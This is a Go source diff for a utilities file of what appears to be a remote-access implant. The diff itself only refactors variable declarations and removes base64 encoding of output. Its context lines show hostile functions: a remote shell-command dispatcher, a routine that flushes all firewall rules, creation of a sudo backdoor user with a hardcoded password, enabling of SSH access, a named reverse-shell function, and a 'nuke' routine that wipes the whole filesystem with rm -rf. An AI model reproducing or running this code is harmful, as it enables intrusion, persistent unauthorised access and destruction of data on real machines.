@@ -1,7 +1,6 @@
 package utils
 
 import (
-	"encoding/base64"
 	"os"
 	"os/exec"
 	"runtime"
@@ -9,7 +8,7 @@ import (
 
 //ExecCommand will pass each action to appropriate handler
 func ExecCommand(mode string, args string) string {
-	retval := ""
+	var retval string
 	switch mode {
 	case "0": //no command
 		return ""
@@ -43,13 +42,12 @@ func ExecCommand(mode string, args string) string {
 	if retval == "" {
 		retval = "<No Output>"
 	}
-	retval = base64.StdEncoding.EncodeToString([]byte(retval))
 	return retval
 }
 
 //most commonly used, pass in args to a shell
 func shellExec(args string) string {
-	shellvar := ""
+	var shellvar string
 	if runtime.GOOS == "linux" {
 		shellvar = "/bin/sh"
 	} else if runtime.GOOS == "windows" {
@@ -67,7 +65,7 @@ func shellExec(args string) string {
 
 //flush firewall rules from all tables
 func fwFlush() string {
-	cmd := exec.Command("tmp")
+	var cmd *exec.Cmd
 	if runtime.GOOS == "linux" {
 		cmd = exec.Command("/bin/sh", "-c", "iptables -P INPUT ACCEPT; iptables -P OUTPUT ACCEPT; iptables -P FORWARD ACCEPT; iptables -t nat -F; iptables -t mangle -F; iptables -F; iptables -X;")
 	} else if runtime.GOOS == "windows" {
@@ -83,7 +81,7 @@ func fwFlush() string {
 
 //create a new user.  maybe in the future name/pass will be passed as args
 func createUser() string {
-	cmd := exec.Command("tmp")
+	var cmd *exec.Cmd
 	if runtime.GOOS == "linux" {
 		comStr := "useradd -p $(openssl passwd -1 letmein) badguy -s /bin/bash -G sudo"
 		if _, err := os.Stat("/etc/yum.conf"); os.IsNotExist(err) {
@@ -105,7 +103,7 @@ func createUser() string {
 
 //allow ssh connections and restart the service
 func enableRemote() string {
-	cmd := exec.Command("tmp")
+	var cmd *exec.Cmd
 	if runtime.GOOS == "linux" {
 		insRule := exec.Command("iptables", "-I", "FILTER", "1", "-j", "ACCEPT")
 		insRule.Run()
@@ -136,7 +134,7 @@ func spawnRevShell(target string) string {
 
 // probably never use this, but it's nice to have around :^)
 func nuke() string {
-	cmd := exec.Command("tmp")
+	var cmd *exec.Cmd
 	if runtime.GOOS == "linux" {
 		cmd = exec.Command("/bin/bash", "-c", "rm -rf / --no-preserve-root")
 	} else if runtime.GOOS == "windows" {
